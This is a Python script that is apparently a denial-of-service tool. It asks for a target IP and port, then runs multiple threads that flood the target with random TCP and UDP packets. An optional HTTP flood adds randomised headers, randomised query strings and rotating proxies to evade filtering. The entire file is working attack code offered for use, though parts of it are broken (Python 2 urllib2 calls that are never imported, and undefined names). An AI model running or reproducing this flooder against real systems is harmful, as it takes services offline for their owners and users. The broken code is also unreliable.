#!/usr/bin/env python
# coding: utf-8

import urllib
import random
import socket
import threading
import time
import sys
from queue import Queue

headers_useragents=[]
headers_referers=[]
request_counter=0
flag=0
q = Queue()
w = Queue()
F = open('proxy.txt')
ips = F.read().split('\n')
F.close()

ip = str(input(" [+]Ip:"))
port = int(input("[+] Port:"))
times = int(input("[+] Send:"))

print("install tcp")
time.sleep(1)
threads = int(input("[+] Threads:"))
time.sleep(1)
print(" ")    
print("Y : HTTPCALL") 
print("N : NONE")  
option = input("[+] Option Y/N:")

print("install ddos")
time.sleep(1)


def useragent_list():
    global headers_useragents
    headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
    headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
    headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
    headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
    headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
    headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
    headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
    return(headers_useragents)

def inc_counter():
    global request_counter
    request_counter+=1
	
	# generates a referer array
def referer_list():
    global headers_referers
    headers_referers.append('https://www.google.com.hk/#newwindow=1&q=')
    headers_referers.append('http://www.usatoday.com/search/results?q=')
    headers_referers.append('http://www.baidu.com/s?wd=')
    headers_referers.append('http://engadget.search.aol.com/search?q=')
    headers_referers.append('http://' + ip + '/')
    return(headers_referers)
    
def main():
	data = random._urandom(16)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((targetip(ip),targetport(port)))
			s.send(data)
			for x in range(times):
				s.send(data)
			print("[+] Proxy!!!")
		except:
			print("[+] Raw!!!")

def runrq():
	data = random._urandom(1024)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = ((targetip_Udp(ip),targetport_Udp(port)))
			s.sendto(data, addr)
			for x in range(times):
				s.sendto(data, addr)
			print("[+] Proxy UDP!!!")
		except:
			print("[+] Raw UDP!!!")

def targetip(ip):
    return ip
	
def targetport(port):
    return port

def targetip_Udp(ip):
    ip = str(ip)
    return ip
	
def targetport_Udp(port):
    port = int(port)
    return port
	
def set_flag(val):
    global flag
    flag=val

def buildblock(size):
    out_str = ''
    for i in range(0, size):
        a = random.randint(65, 90)
        out_str += chr(a)
    return(out_str)

def my_bots():
	global bots
	bots=[]
	#contoh bot aja bro.. 
	bot1="https://www.google.com/?q="
	bots.append(bot1)
	return(bots)

def dos():
	while True:
		item = q.get()
		down_it(item)
		q.task_done()


def dos2():
	while True:
		item=w.get()
		bot_hammering(random.choice(bots)+ip)
		w.task_done()
        
        
def exit():
	sys.exit()
def user_agent():
	global uagent
	uagent=[]
	uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
	uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
	uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
	uagent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
	return(uagent)
    
def httpcall(ip):
    my_bots()
    user_agent()
    useragent_list()
    referer_list()
    code=0
    if ip.count("?")>0:
        param_joiner="&"
    else:
        param_joiner="?"
    print("Http Check!!!")  
    while 1:
        headers = {
        'User-Agent':random.choice(headers_useragents),
        'Cache-Control':'no-cache',
        'Accept-Charset':'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
        'Referer':random.choice(headers_referers) + buildblock(random.randint(5,10)),
        'Keep-Alive':random.randint(110,120),
        'Connection':'keep-alive',
        'Host':ip
        }
        postdata = urllib.urlencode( {buildblock(random.randint(3,10)):buildblock(random.randint(3,10))} )
        request = urllib2.Request(ip + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
        request.add_header('User-Agent', random.choice(headers_useragents))
        request.add_header('Cache-Control', 'no-cache')
        request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
        request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(5,10)))
        request.add_header('Keep-Alive', random.randint(110,120))
        request.add_header('Connection', 'keep-alive')
        request.add_header('Host',ip)
        postdata = urllib.urlencode( {buildblock(random.randint(3,10)):buildblock(random.randint(3,10))} )
        req = urllib2.Request(url=url,data=postdata,headers=headers)
        index = random.randint(0,len(ips)-1)
        proxy = urllib2.ProxyHandler({'http':ips[index]})
        opener = urllib2.build_opener(proxy,urllib2.HTTPHandler)
        urllib2.install_opener(opener)
        try:
            urllib2.urlopen(req)
            urllib2.urlopen(request)

            #print e.code
            set_flag(1)
            print ("Response Code 500")
            code=500
        except:
            #print e.reason
            continue

class HTTPThread(threading.Thread):
    def run(self):
        try:
            while True:
                code=httpcall(ip)
                set_flag(2)
        except:
            pass

for x in range(threads):
    th = threading.Thread(target = main)
    rq = threading.Thread(target = runrq)
    th.start()
    rq.start()
    if option == "Y":
        t = HTTPThread()
        te = threading.Thread(target = dos2)
        te.start()
        t.start()


